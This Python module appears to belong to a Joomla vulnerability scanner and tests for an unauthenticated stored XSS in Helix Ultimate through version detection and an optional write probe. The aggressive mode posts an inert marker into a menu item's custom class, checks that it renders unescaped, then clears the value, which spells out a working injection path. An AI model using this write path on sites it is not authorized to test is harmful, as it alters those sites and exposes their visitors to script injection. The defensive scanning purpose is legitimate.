from __future__ import annotations

import json
import re
import secrets
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, request, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe, version_lte

CVE_ID = "CVE-2026-57829"
NAME = "Helix Ultimate unauthenticated stored XSS"
COMPONENT = "Helix Ultimate Framework"
AFFECTED_RULE = "Helix Ultimate 1.0 through 2.2.6; fixed in 2.2.7"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
AJAX_PATH = "/index.php?option=com_ajax&plugin=helixultimate&format=json&task=saveMegaMenuSettings"
MENU_ITEM_RE = re.compile(r'class="[^"]*\bitem-(\d+)\b')


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if version_lte(version, "2.2.6") else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("helixultimate", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Helix Ultimate was not detected.", action="No action is required unless Helix Ultimate is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Helix Ultimate {version}, within the affected range."
        action = "Upgrade Helix Ultimate to 2.2.7 or newer and inspect menu parameters for unexpected markup."
    elif status == "NOT_AFFECTED":
        detail = f"Detected Helix Ultimate {version}, outside the affected range."
        action = "No action is required for this CVE when version detection is accurate."
    else:
        detail = "Helix Ultimate was detected, but its version could not be determined."
        action = "Determine the installed Helix Ultimate version and upgrade to 2.2.7 or newer."
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="HIGH" if status != "DETECTED_VERSION_UNKNOWN" else "MEDIUM", component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    url = f"{normalize_url(target_url)}{AJAX_PATH}"
    response = request(url, timeout=timeout, proxy=proxy)
    status = int(response.get("status", 0))
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Helix AJAX dispatcher could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable; no XSS conclusion can be drawn from a transport failure.")
    if status in {404, 410} or response.get("redirected"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Helix AJAX task was not publicly reachable; the stored-XSS write path could not be tested.", action="Upgrade affected versions and verify the Helix AJAX dispatcher on an authorized staging site.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Helix AJAX dispatcher responded (HTTP {status}), but proving stored XSS requires a state-changing menu write and subsequent page load. The safe probe sent no write payload.", action="Upgrade Helix Ultimate to 2.2.7 or newer; use the aggressive inert-marker probe only on authorized staging data.")


def _discover_menu_item(body: str) -> int | None:
    for match in MENU_ITEM_RE.finditer(body or ""):
        value = int(match.group(1))
        if value > 0:
            return value
    return None


def _write_accepted(response: dict[str, Any]) -> tuple[bool, str | None]:
    """Return ``(accepted, refusal_message)`` for a saveMegaMenuSettings reply."""
    try:
        parsed = json.loads(response.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return False, None
    if not isinstance(parsed, dict):
        return False, None
    data = parsed.get("data")
    if parsed.get("success") is True and isinstance(data, dict) and data.get("status") is True:
        return True, None
    message = data.get("message") if isinstance(data, dict) else None
    if not message:
        message = parsed.get("message") or parsed.get("output")
    return False, str(message) if message else None


def _marker_rendered(body: str, marker: str) -> bool:
    index = body.find(marker)
    while index >= 0:
        start = body.rfind('class="', 0, index)
        if start >= 0 and ">" not in body[start:index]:
            return True
        index = body.find(marker, index + 1)
    return False


def run_aggressive_probe(
    target_url: str,
    menu_item: int | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Write an inert marker into a menu item and verify the unescaped render.

    The marker is a single alphanumeric token followed by one double quote. It
    contains no tag, event handler, or script, so the worst case is a stray
    attribute; the quote proves whether the sink escaped the value. The original
    ``helixultimatemenulayout`` value cannot be read back through the public
    endpoint, so cleanup clears the key (the documented PoC behaviour) and the
    probe verifies the marker is gone afterwards.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    page = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/", detail=f"The target could not be reached while looking for a menu item ({transport_error_detail(page)}).", action="Retry when the target is reachable.")

    item_id = menu_item or _discover_menu_item(page.get("body") or "")
    if not item_id:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", detail="No published menu item id could be discovered in the homepage markup, so the mega-menu write target is unknown.", action="Re-run with --aggressive-arg menuitem=<published item id> on an authorized staging site.")

    marker = f"proofcms57829{secrets.token_hex(6)}\""
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    write = client.request(
        f"{base}{AJAX_PATH}",
        method="POST",
        headers=headers,
        data=form_encode({"settings[customclass]": marker, "id": str(item_id)}),
        timeout=timeout,
        follow_redirects=False,
    )
    if is_transport_error(write):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", detail=f"The mega-menu write request failed in transit ({transport_error_detail(write)}).", action="Retry when the target is reachable.")

    accepted, refusal = _write_accepted(write)
    evidence: dict[str, Any] = {
        "menu_item": item_id,
        "marker": marker,
        "write_status": write.get("status"),
        "write_accepted": accepted,
        "refusal": refusal,
        "render_checked": False,
        "marker_rendered": False,
        "cleanup_attempted": False,
        "cleanup_verified": False,
    }

    rendered = False
    if accepted:
        after = client.get(f"{base}/", timeout=timeout)
        after_body = after.get("body") or ""
        evidence["render_checked"] = not is_transport_error(after)
        rendered = _marker_rendered(after_body, marker)
        evidence["marker_rendered"] = rendered

    restore = client.request(
        f"{base}{AJAX_PATH}",
        method="POST",
        headers=headers,
        data=form_encode({"id": str(item_id)}),
        timeout=timeout,
        follow_redirects=False,
    )
    restore_accepted, _ = _write_accepted(restore)
    evidence["cleanup_attempted"] = True
    evidence["cleanup_accepted"] = restore_accepted
    if not is_transport_error(restore):
        verify = client.get(f"{base}/", timeout=timeout)
        if not is_transport_error(verify):
            evidence["cleanup_verified"] = marker not in (verify.get("body") or "")

    if accepted and rendered:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{AJAX_PATH}",
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=bool(evidence["cleanup_verified"]),
            detail=(
                f"An unauthenticated POST stored the inert marker {marker!r} in menu item {item_id} "
                "and the homepage rendered it inside a class attribute without escaping the quote. "
                "The marker contained no tag, event handler, or script."
            ),
            action="Upgrade Helix Ultimate to 2.2.7 or newer and review stored menu parameters for injected markup.",
        )

    if accepted:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{AJAX_PATH}",
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=bool(evidence["cleanup_verified"]),
            detail=(
                f"The mega-menu write was accepted for menu item {item_id}, but the marker did not appear in the "
                "homepage class attributes (page or module cache may hide it)."
            ),
            action="Purge Joomla page/module cache and re-run, or verify the stored value manually.",
        )

    write_status = int(write.get("status") or 0)
    guarded = 300 <= write_status < 400
    if refusal:
        detail = f"The dispatcher refused the write: {refusal.rstrip('.')}."
    elif guarded:
        detail = (
            f"The unauthenticated write was answered with a redirect (HTTP {write_status}), consistent with the "
            "token/authorization guard added in fixed Helix Ultimate releases."
        )
    else:
        detail = f"The unauthenticated write was not accepted (HTTP {write_status})."
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM" if (refusal or guarded) else "LOW",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{AJAX_PATH}",
        evidence=evidence,
        cleanup_attempted=True,
        cleanup_verified=bool(evidence["cleanup_verified"]),
        detail=detail,
        action="If the installed version is at or below 2.2.6, verify the dispatcher manually on an authorized target.",
    )


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Helix Ultimate was not detected as potentially affected."
            return passive
        raw_item = aggressive_value(aggressive_args, aggressive_command, "menuitem")
        menu_item: int | None = None
        if raw_item:
            try:
                menu_item = int(raw_item)
            except ValueError:
                menu_item = None
        result = run_aggressive_probe(target_url, menu_item=menu_item, timeout=timeout, proxy=proxy)
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (reachability) and aggressive (inert-marker write) modes."
        return passive
    if passive.status != "LIKELY_VULNERABLE":
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "module_version": "2.0.0", "last_reviewed": "2026-11-14", "updated": "2026-11-14", "required_detectors": ["helixultimate"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-57829", "https://github.com/Is4yev/CVE-2026-57829", "https://github.com/advisories/GHSA-6r9m-9724-qfvg"]}
